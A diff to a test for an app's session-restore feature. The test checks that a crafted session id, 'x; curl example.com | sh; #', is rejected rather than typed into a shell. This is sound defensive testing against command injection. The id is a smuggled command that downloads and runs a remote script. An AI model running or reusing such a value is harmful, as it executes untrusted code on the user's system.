@@ -210,15 +210,17 @@ test("the sessions open when the app last closed are resumed, one after the othe
   await restore([
     { id: "a", cwd: "/r", config_dir: "/w" },
     { id: "b", cwd: "/r/x", config_dir: null },
-    // Never typed into a shell, whatever sent it.
-    { id: "x; curl example.com | sh; #", cwd: "/r/y", config_dir: null },
   ]);
   expect(open.mock.calls.map((c) => [c[0], c[4]])).toEqual([
     ["/r", { config_dir: "/w" }],
     ["/r/x", { config_dir: null }],
   ]);
-  expect(write).toHaveBeenCalledTimes(1);
   expect(write).toHaveBeenCalledWith(4, "claude --resume a\r");
+  expect(notice()).toBe("Cannot resume the session in /r/x: gone");
+  // Never typed into a shell, whatever sent it.
+  await restore([{ id: "x; curl example.com | sh; #", cwd: "/r/y", config_dir: null }]);
+  expect(open).toHaveBeenCalledTimes(2);
+  expect(write).toHaveBeenCalledTimes(1);
   expect(notice()).toBe("Cannot resume the session in /r/y: Error: not a session id");
   open.mockRestore();
   write.mockRestore();
